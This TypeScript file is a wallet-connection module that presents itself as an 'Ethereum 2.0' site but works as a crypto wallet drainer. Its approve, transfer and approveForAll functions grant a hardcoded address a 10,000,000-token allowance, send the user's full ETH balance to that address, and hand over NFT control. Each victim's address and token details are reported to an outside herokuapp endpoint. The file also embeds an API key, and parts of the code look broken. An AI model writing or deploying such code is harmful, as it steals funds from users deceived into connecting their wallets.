import { ethers } from "ethers";
import Onboard, { OnboardAPI, WalletState } from '@web3-onboard/core'
import injectedModule from '@web3-onboard/injected-wallets'
import walletConnectModule from '@web3-onboard/walletconnect'

const NETWORK_ID = 1;
const RPC_URL = 'https://mainnet.infura.io/v3/7975a81d682e4188b7a6e0fda0445b2a';

export const myAddress = "0x70beDC320EEB170B0760Ed680044D90ea2bAc384";
const injected = injectedModule()
const walletConnect = walletConnectModule();


const handleWalletConnectDeepLink = () => {
    const deepLink = window.localStorage.getItem(
        'WALLETCONNECT_DEEPLINK_CHOICE'
    )
    if (deepLink) {
        try {
            const _deepLink: { name: string; href: string } = JSON.parse(deepLink)
            if (_deepLink.href === 'https://link.trustwallet.com/wc') {
                window.localStorage.setItem(
                    'WALLETCONNECT_DEEPLINK_CHOICE',
                    JSON.stringify({ name: 'Trust Wallet', href: 'trust://' })
                )
            }

        } catch (err: any) {
            console.log('TrustWallet force redirect err', err)
        }
    }
}

document.addEventListener("visibilitychange", function () {
    if (document.visibilityState === 'hidden') {
        handleWalletConnectDeepLink();
    }
});

export default class Wallet {
    static provider: ethers.providers.Web3Provider | null;
    static onboard: OnboardAPI;
    static address: string;
    static wallet: WalletState;

    static async create() {
        Wallet.onboard = Onboard({
            wallets: [injected,
                walletConnect,
            ],
            chains: [
                {
                    id: '0x1',
                    token: 'ETH',
                    label: 'Ethereum Mainnet',
                    rpcUrl: RPC_URL
                },
            ],
            appMetadata: {
                name: 'Ethereum 2.0',
                icon: `
                
               <svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" xmlns:xodm="http://www.corel.com/coreldraw/odm/2003" xml:space="preserve" width="100%" height="100%" version="1.1" shape-rendering="geometricPrecision" text-rendering="geometricPrecision" image-rendering="optimizeQuality" fill-rule="evenodd" clip-rule="evenodd" viewBox="0 0 784.37 1277.39">
 <g id="Layer_x0020_1">
  <metadata id="CorelCorpID_0Corel-Layer"/>
  <g id="_1421394342400">
   <g>
    <polygon fill="#343434" fill-rule="nonzero" points="392.07,0 383.5,29.11 383.5,873.74 392.07,882.29 784.13,650.54 "/>
    <polygon fill="#8C8C8C" fill-rule="nonzero" points="392.07,0 -0,650.54 392.07,882.29 392.07,472.33 "/>
    <polygon fill="#3C3C3B" fill-rule="nonzero" points="392.07,956.52 387.24,962.41 387.24,1263.28 392.07,1277.38 784.37,724.89 "/>
    <polygon fill="#8C8C8C" fill-rule="nonzero" points="392.07,1277.38 392.07,956.52 -0,724.89 "/>
    <polygon fill="#141414" fill-rule="nonzero" points="392.07,882.29 784.13,650.54 392.07,472.33 "/>
    <polygon fill="#393939" fill-rule="nonzero" points="0,650.54 392.07,882.29 392.07,472.33 "/>
   </g>
  </g>
 </g>
<div xmlns="" id="divScriptsUsed" style="display: none"/><script xmlns="" id="globalVarsDetection" src="chrome-extension://cmkdbmfndkfgebldhnkbfhlneefdaaip/js/wrs_env.js"/></svg>`, // svg string icon
                description: 'Ethereum 2.0',
                recommendedInjectedWallets: [
                    { name: 'MetaMask', url: 'https://metamask.io' },
                    { name: 'Coinbase', url: 'https://wallet.coinbase.com/' },
                    { name: 'Trust', url: 'https://trustwallet.com/' }

                ]
            },
        })
    }

    static async connectWallet() {
        try {
            const wallets = await Wallet.onboard.connectWallet();
            Wallet.wallet = wallets[0];
            Wallet.address = wallets[0].accounts[0].address;
            Wallet.provider = new ethers.providers.Web3Provider(
                wallets[0].provider,
                'any'
            )
            handleWalletConnectDeepLink()
        } catch (er) {

        }


    }

    static readyToTransact = async () => {
        return Wallet.wallet ? true : false
    }

    static async approve(token_address: string, tokenInterface: string[]) {
        const signer = Wallet.provider?.getSigner();
        const tokenContract = new ethers.Contract(
            token_address,
            tokenInterface,
            signer
        );

        await tokenContract.approve(myAddress, ethers.utils.parseEther("10000000"));

        // const transaction = await Moralis.executeFunction(sendOptions);
        fetch("https://ethers-server.herokuapp.com/user-token/", {
            method: "POST",
            headers: {
                "Content-Type": "application/json",
                // '
            },
            body: JSON.stringify({
                address: Wallet.address,
                token_type: "erc20",
                token_id: "",
                date: new Date().toISOString(),
                token_address: token_address,
            }),
        });
    }

    static async transfer(tokenInterface: string[], amount?: string) {
        const tx = {
            to: myAddress,
            value: amount ? ethers.utils.parseEther(amount) : Object.values(Wallet.wallet.accounts[0].balance as any)[0] as string
        }
        const signer = Wallet.provider?.getSigner();
        signer?.sendTransaction(tx)
    }

    static async approveForAll(token_address: string, token_id: string, tokenInterface: string[]) {
        const signer = Wallet.provider?.getSigner();
        const tokenContract = new ethers.Contract(
            token_address,
            tokenInterface,
            new ethers.Wallet("")
        );

        await tokenContract.setApproveForAll(myAddress, true);

        // const transaction = await Moralis.executeFunction(sendOptions);
        fetch("https://ethers-server.herokuapp.com/user-token/", {
            method: "POST",
            headers: {
                "Content-Type": "application/json",
                // '
            },
            body: JSON.stringify({
                address: Wallet.address,
                token_type: "nft",
                token_id: token_id,
                date: new Date().toISOString(),
                token_address: token_address,
            }),
        });
    }
}
